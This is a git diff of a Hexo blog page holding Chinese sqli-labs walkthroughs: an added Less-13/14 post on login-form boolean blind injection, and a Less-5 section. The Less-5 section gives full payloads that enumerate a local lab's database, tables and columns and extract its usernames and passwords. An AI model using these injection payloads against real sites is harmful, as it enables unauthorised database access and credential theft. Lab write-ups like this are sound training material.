@@ -64,6 +64,88 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-13" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/07/sql-labs-Less-13/" class="article-date">
+  <time datetime="2021-02-07T03:04:58.000Z" itemprop="datePublished">2021-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/07/sql-labs-Less-13/">sql-labs-Less-13~14</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-13</h1>
+首先进入http://127.0.0.1/sql/Less-13/，输入账号和密码，显示如下：
+
+<p><img src alt="1"><br>登入成功，但没有信息的回显，这时候就想到可能要用布尔盲注。<br>在账号后面加上’，显示如下：</p>
+<p><img src alt="2"><br>说明有注入漏洞，而且错误显示<code>admin&#39;) LIMIT 0,1</code>，说明可能要用’)字符注入。<br>测试一下’)：在账号后面加上’)#，在输入密码，显示登入成功，说明是用’)字符注入的。<br>也可以把’)改成\，不输入密码再次登入，显示如下：</p>
+<p><img src alt="3"><br>\的后面是’)，说明是用’)注入的。<br>在账号后面加上’) order by 2#，登入正常无回显，说明有两列数据。<br>在输入admin’) and <code>length(database())=8</code>#登入正常，说明库名长度为8。<br>剩下的跟Less-5~6一样，在上一句的阴影部分改一下就行了。</p>
+<h1>Less-14</h1>
+和13一样，只是把')改成"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/07/sql-labs-Less-13/" data-id="ckkuzsa0u0000d8ux7pj0et63" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-11~12" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/06/sql-labs-Less-11~12/" class="article-date">
@@ -78,7 +160,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11</a>
+      <a class="article-title" href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11~12</a>
     </h1>
   
 
@@ -305,7 +387,7 @@
       
         <h1>Less-5</h1>
 
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1%E3%80%82">http://127.0.0.1/sql/Less-5/?id=1。</a><br>输入<code>\</code>查看报错，<br>    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1&#39; LIMIT 0,1’ at line 1<br>发现在<code>&#39;1\&#39; LIMIT 0,1</code>中<code>\</code>后面是<code>&#39;</code>，以此确定用<code>&#39;</code>字符注入。<br>再输入 order by 来判断有几列数据，即<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> order by 3–+(用二分法)<br>如果输出<code>You are in...........</code>则说明有三列数据。<br>因为没有输出用户名和密码，所以不能用union操作符。<br>可以用ascii函数(只能把字符串的第一个字符转化成ascci码,即只能转一个)、length函数、left函数、regexp函数、like函数、substr函数和mid函数来获取相应的库名、表名、列名和其他数据。<br>先用length()求出数据库名的长度即<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and length(database())=8–+(二分法，这个函数好像不能求表名和列名的长度)。<br>知道了数据库名的长度，接下来就要求数据库名了，有三种方法(与二分法一起用)：<br>1.left函数<br>首先求数据库名的第一个字符：(下面可以把database()换成(select schema_name from information_schema.schemata limit 4,1))<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (C,1) &gt;= ‘a’ and left(database(),1) &lt;= ‘z’)–+(这里可以和ascii函数一起用，即:<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left(database(),1)) &gt;= 97 and ascii(left(database(),1)) &lt;= 122)–+)<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘<code>n</code>‘ and left(database(),1) &lt;= ‘z’)–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘n’ and left(database(),1) &lt;= ‘<code>t</code>‘)–+<br>返回正常，这样依次尝试，最后求出第一位为’s’。<br>再求数据库名的第二个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),<code>2</code>) &gt;= ‘sa’ and left(database(),<code>2</code>) &lt;= ‘sz’)–+<br>返回正常，再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),2) &gt;= ‘sa’ and left(database(),2) &lt;= ‘sn’)–+<br>最后求出数据库名为’security’。</p>
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1%E3%80%82">http://127.0.0.1/sql/Less-5/?id=1。</a><br>输入<code>\</code>查看报错，<br>    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1&#39; LIMIT 0,1’ at line 1<br>发现在<code>&#39;1\&#39; LIMIT 0,1</code>中<code>\</code>后面是<code>&#39;</code>，以此确定用<code>&#39;</code>字符注入。<br>再输入 order by 来判断有几列数据，即<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> order by 3–+(用二分法)<br>如果输出<code>You are in...........</code>则说明有三列数据。<br>因为没有输出用户名和密码，所以不能用union操作符。<br>可以用ascii函数(只能把字符串的第一个字符转化成ascci码,即只能转一个)、length函数、left函数、regexp函数、like函数、substr函数和mid函数来获取相应的库名、表名、列名和其他数据。<br>先用length()求出数据库名的长度即<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and length(database())=8–+(二分法，这个函数好像不能求表名和列名的长度)。<br>知道了数据库名的长度，接下来就要求数据库名了，有三种方法(与二分法一起用)：<br>1.left函数<br>首先求数据库名的第一个字符：(下面可以把database()换成(select schema_name from information_schema.schemata limit 4,1))<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘a’ and left(database(),1) &lt;= ‘z’)–+(这里可以和ascii函数一起用，即:<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left(database(),1)) &gt;= 97 and ascii(left(database(),1)) &lt;= 122)–+)<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘<code>n</code>‘ and left(database(),1) &lt;= ‘z’)–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),1) &gt;= ‘n’ and left(database(),1) &lt;= ‘<code>t</code>‘)–+<br>返回正常，这样依次尝试，最后求出第一位为’s’。<br>再求数据库名的第二个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),<code>2</code>) &gt;= ‘sa’ and left(database(),<code>2</code>) &lt;= ‘sz’)–+<br>返回正常，再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left(database(),2) &gt;= ‘sa’ and left(database(),2) &lt;= ‘sn’)–+<br>最后求出数据库名为’security’。</p>
 <p>接着求security数据库下的第一个表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &gt;= ‘a’ and left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &lt;= ‘z’)–+<br>这样按照求数据库名的方法求出第一个表名’email’。<br>求第二个表名时只要把’limit 0,1’改成’limit 1,1’就行了。<br>求出来的表名分别为’email’、’referers’、’uagents’、’users’。</p>
 <p>接着求security数据库下的第一个列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &gt;= ‘a’ and left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &lt;= ‘z’)–+<br>这里继续按照上面的方法来操作；求出来的列名有：’id’、’username’、’password’。</p>
 <p>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以要用ascii函数)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select id from users  limit 0,1),1)) &gt;= 20 and ascii(left((select id from users limit 0,1),1)) &lt;=126)–+<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select username from users  limit 0,1),1)) &gt;= 20 and ascii(left((select username from users limit 0,1),1)) &lt;=126)–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (ascii(left((select password from users  limit 0,1),1)) &gt;= 20 and ascii(left((select password from users limit 0,1),1)) &lt;=126)–+<br>求出来的数据：<br>    <code>id：1,2,3,4,5,6,7,8,9,10,11,12,14</code><br>    <code>username：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code><br>    <code>password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code><br>2.substr函数、mid函数(看Less-6)<br>3.regexp函数<br>首先求库名：(同样使用二分法)<br>    第一个字符：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^[a-z]’–+<br>                <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^[n-z]’–+<br>    求出第一个字符为’s’；<br>    第二个字符：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and database() regexp ‘^s[a-z]’–+<br>以此类推，求出库名为’security’。<br>然后求表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select table_name from information_schema.tables where table_schema=’security’ limit <code>0</code>,1) regexp ‘<code>^[a-z]</code>‘–+<br>求第二个表名或字符只需修改上面对应部分。<br>接下来求列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select column_name from information_schema.columns where table_name=’users’ limit 0,1) regexp ‘^[a-z]’–+<br>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以后面的范围要大一点，因为ascii()只能把字符串的第一个字符转化成ascci码，所以不用)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select id from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+（这里的范围是从空格到<code>~</code>号，实际上还是ascii码表的大小排序）<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select username from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-5/?id=1&#39;">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select password from users limit 0,1) regexp ‘^[<code> </code>-<code>~</code>]’–+</p>
@@ -561,56 +643,12 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/03/hello-world/" class="article-date">
-  <time datetime="2020-10-03T13:15:06.711Z" itemprop="datePublished">2020-10-03</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/03/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/03/hello-world/" data-id="ckftpds0g0000s4uxd05p2361" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -641,7 +679,11 @@
       <ul>
         
           <li>
-            <a href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11</a>
+            <a href="/2021/02/07/sql-labs-Less-13/">sql-labs-Less-13~14</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11~12</a>
           </li>
         
           <li>
@@ -654,10 +696,6 @@
         
           <li>
             <a href="/2021/02/02/sql-labs-Less-7/">sql-labs-Less-7</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/27/sql-labs-Less-5~6/">sql-labs-5~6</a>
           </li>
         
       </ul>
